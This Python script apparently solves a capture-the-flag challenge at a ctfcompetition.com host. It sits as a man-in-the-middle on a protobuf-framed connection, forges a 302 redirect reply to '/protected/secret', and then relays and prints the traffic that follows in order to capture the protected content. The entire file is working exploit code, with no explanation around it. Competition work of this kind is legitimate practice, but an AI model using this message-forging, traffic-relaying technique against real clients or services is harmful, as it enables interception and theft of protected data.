import exchange_pb2
import time
import connection
import hashlib

def l32(i):
    ret = ''
    ret += chr((i>>0)&0xFF)
    ret += chr((i>>8)&0xFF)
    ret += chr((i>>16)&0xFF)
    ret += chr((i>>24)&0xFF)
    return ret
    
def unl32(s):
    assert len(s) == 4
    ret = 0
    ret += ord(s[0])
    ret += ord(s[1]) << 8
    ret += ord(s[2]) << 16
    ret += ord(s[3]) << 24
    return ret
    
def recv_protobuf(conn):
    length = unl32(conn.recvn(4))
    return exchange_pb2.Exchange.FromString(conn.recvn(length))
    
def send_protobuf(conn, protobuf):
    data = protobuf.SerializeToString()
    length = l32(len(data))
    conn.send(length+data)
    
def thru_protobuf(conn, isPrinted=True):
    ex = recv_protobuf(conn)
    if isPrinted: print ex
    send_protobuf(conn, ex)

proxy = None
conn = connection.Connection(('ssl-added-and-removed-here.ctfcompetition.com', 13001), proxy, True)

ex = recv_protobuf(conn)
fake_reply_ex = exchange_pb2.Exchange()
fake_reply_ex.reply.status = 302
header = fake_reply_ex.reply.headers.add()
header.key = 'Location'
header.value = '/protected/secret'
send_protobuf(conn, fake_reply_ex)

thru_protobuf(conn, True)
thru_protobuf(conn, True)
thru_protobuf(conn, True)
thru_protobuf(conn, True)